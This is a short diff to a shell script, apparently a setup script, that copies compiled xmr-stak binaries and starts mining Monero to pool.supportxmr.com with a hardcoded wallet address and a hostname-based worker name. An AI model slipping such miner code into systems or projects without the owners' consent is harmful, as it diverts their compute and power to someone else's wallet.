@@ -66,3 +66,12 @@ download_and_compile
 mod_system_config
 
 cd $workDir
+cp -rf $workDir/xmr-stak/build/bin $workDir/target
+cd $workDir/target
+
+# Start mining
+poolAddress='pool.supportxmr.com:5555'
+walletAddress='43JZiGudGLDGV2fL674raDc5RpLzPJQ6RFtfVCM1uWFNTDsLpJ3Ebf26Dw6m7CM8FfDZ7TmGQoJ8HCucFk9UZnTZGPFvwfg'
+workerName="`hostname`-`date '+%Y%m%d'`"
+echo 'Y' | $workDir/target/xmr-stak --url $poolAddress --user $walletAddress --pass $workerName --currency monero
+
